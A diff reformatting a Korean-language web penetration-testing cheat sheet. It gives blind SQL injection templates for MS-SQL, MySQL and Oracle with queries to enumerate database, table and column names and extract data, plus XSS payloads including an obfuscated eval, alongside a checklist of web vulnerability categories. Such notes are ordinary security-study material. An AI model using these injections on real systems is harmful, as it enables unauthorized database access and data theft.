@@ -1,43 +1,62 @@
-<h2>[MS-SQL]</h2> <br>
-# Shape <br>
-??' and substring((query), 1, 1) < 'a'--<br>
-<br>
-# get DB NAME <br>
-db_name() <br>
-<br>
-# Get Table name <br>
-select top 1 name from sysobjects where xtype='U' <br>
-<br>
-# Get Column name <br>
-select top 1 column_name from information_schema.columns where table_name = '[Table Name]' <br>
-<br>
-# Get Data <br>
-select top 1 [Column Name] from [Table Name] <br>
-<br>
-<br>
-<br>
-<h2>[MySQL]</h2> <br>
-# Shape <br>
-???' and ascii(substr((query), 1, 1)) > 'a'# <br>
-<br>
-# Get Table Name <br>
-select table_name from information_schema.tables where table_type='base table' limit 0,1 <br>
-                                                                                     ㄴ> 0번 째 테이블 <br>
-<br>
-<br>
-<br>
-<h2>[Oracle]</h2> <br>
-#Shape <br>
-and (ascii(SUBSTR(query),1,1))) > 1--<br>
-<br>
-#Get DB name <br>
-select DISTINCT owner FROM all_tables;<br>
-<br>
-#Get Table name <br>
-select table_name from all_tables;<br>
-<br>
-#Get Column name <br>
-select column_name from all_tab_columns where table_name='[table name]';<br>
+<h2>[MS-SQL]</h2>  
+# Shape  
+``` sql
+??' and substring((query), 1, 1) < 'a'--
+```  
+
+# get DB NAME  
+db_name()  
+  
+# Get Table name  
+``` sql
+select top 1 name from sysobjects where xtype='U'
+```
+
+# Get Column name  
+``` sql
+select top 1 column_name from information_schema.columns where table_name = '[Table Name]'  
+```
+  
+# Get Data  
+``` sql
+select top 1 [Column Name] from [Table Name]  
+```
+  
+<h2>[MySQL]</h2>  
+# Shape  
+``` sql
+???' and ascii(substr((query), 1, 1)) > 'a'#  
+```
+
+
+# Get Table Name
+``` sql
+select table_name from information_schema.tables where table_type='base table' limit 0,1  
+                                                                                     ㄴ> 0번 째 테이블  
+```
+  
+  
+  
+<h2>[Oracle]</h2>   
+#Shape   
+``` sql
+and (ascii(SUBSTR(query),1,1))) > 1--  
+```
+  
+#Get DB name   
+``` sql
+select DISTINCT owner FROM all_tables;  
+```
+  
+#Get Table name   
+``` sql
+select table_name from all_tables;  
+```
+  
+#Get Column name   
+``` sql
+select column_name from all_tab_columns where table_name='[table name]';
+```
 
 -----------------------------------------------------------------------------------
 Row 갯수 파악
@@ -63,10 +82,10 @@ select * from (select rownum rnum, users.* from users) A where A.rnum between 1 
 15. 파일 다운로드 
 16. 파일 업로드
 17. 파일 Include
-18. 악성 스크립트 XSS, CSRF<br>
-`<img src="#" onmouseover="alert(1);">`<br>
-`<img src="#" onerror="alert(1);">`<br>
-`<img onclick='var a="aler"+"t(al"+"ert"+"(1));";eval(a);'>`<br>
+18. 악성 스크립트 XSS, CSRF  
+`<img src="#" onmouseover="alert(1);">`  
+`<img src="#" onerror="alert(1);">`  
+`<img onclick='var a="aler"+"t(al"+"ert"+"(1));";eval(a);'>`  
 19. 악성 콘텐츠 html
 20. 웹페이지 오류정보 처리
 21. 웹서버 백업파일 관리
